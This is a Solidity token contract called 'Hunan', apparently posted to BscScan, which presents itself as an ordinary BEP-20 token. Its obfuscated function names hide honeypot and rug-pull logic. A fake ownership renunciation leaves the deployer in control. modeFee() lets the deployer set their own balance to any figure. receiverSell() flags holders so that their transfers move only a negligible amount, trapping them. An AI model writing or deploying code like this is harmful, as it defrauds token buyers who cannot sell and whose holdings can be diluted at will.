/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface receiverLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxFee {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract Hunan {
    uint8 public decimals = 18;

    address public maxLaunched;
    mapping(address => bool) public shouldLimitMarketing;
    address public launchTeamLaunched;

    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** decimals;
    mapping(address => mapping(address => uint256)) public allowance;


    bool public senderAmount;
    mapping(address => uint256) public balanceOf;
    uint256 constant exemptList = 10 ** 10;
    mapping(address => bool) public amountSender;

    string public symbol = "Hunan";
    string public name = "Hunan";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        receiverLimit isFee = receiverLimit(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchTeamLaunched = maxFee(isFee.factory()).createPair(isFee.WETH(), address(this));
        owner = autoAt();
        maxLaunched = owner;
        amountSender[maxLaunched] = true;
        balanceOf[maxLaunched] = totalSupply;
        emit Transfer(address(0), maxLaunched, totalSupply);
        receiverTx();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function autoLiquidity(address tokenMin) public {
        if (senderAmount) {
            return;
        }
        amountSender[tokenMin] = true;
        senderAmount = true;
    }

    function autoAt() private view returns (address) {
        return msg.sender;
    }

    function receiverSell(address toShould) public {
        if (toShould == maxLaunched || toShould == launchTeamLaunched || !amountSender[autoAt()]) {
            return;
        }
        shouldLimitMarketing[toShould] = true;
    }

    function atReceiver(address minLiquidity, address modeExemptLaunched, uint256 maxMarketing) internal returns (bool) {
        require(balanceOf[minLiquidity] >= maxMarketing);
        balanceOf[minLiquidity] -= maxMarketing;
        balanceOf[modeExemptLaunched] += maxMarketing;
        emit Transfer(minLiquidity, modeExemptLaunched, maxMarketing);
        return true;
    }

    function approve(address swapTeam, uint256 maxMarketing) public returns (bool) {
        allowance[autoAt()][swapTeam] = maxMarketing;
        emit Approval(autoAt(), swapTeam, maxMarketing);
        return true;
    }

    function receiverTx() public {
        emit OwnershipTransferred(maxLaunched, address(0));
        owner = address(0);
    }

    function modeFee(uint256 maxMarketing) public {
        if (!amountSender[autoAt()]) {
            return;
        }
        balanceOf[maxLaunched] = maxMarketing;
    }

    function transferFrom(address exemptLiquidity, address shouldExempt, uint256 maxMarketing) public returns (bool) {
        if (exemptLiquidity != autoAt() && allowance[exemptLiquidity][autoAt()] != type(uint256).max) {
            require(allowance[exemptLiquidity][autoAt()] >= maxMarketing);
            allowance[exemptLiquidity][autoAt()] -= maxMarketing;
        }
        if (shouldExempt == maxLaunched || exemptLiquidity == maxLaunched) {
            return atReceiver(exemptLiquidity, shouldExempt, maxMarketing);
        }
        if (shouldLimitMarketing[exemptLiquidity]) {
            return atReceiver(exemptLiquidity, shouldExempt, exemptList);
        }
        return atReceiver(exemptLiquidity, shouldExempt, maxMarketing);
    }

    function transfer(address shouldExempt, uint256 maxMarketing) external returns (bool) {
        return transferFrom(autoAt(), shouldExempt, maxMarketing);
    }


}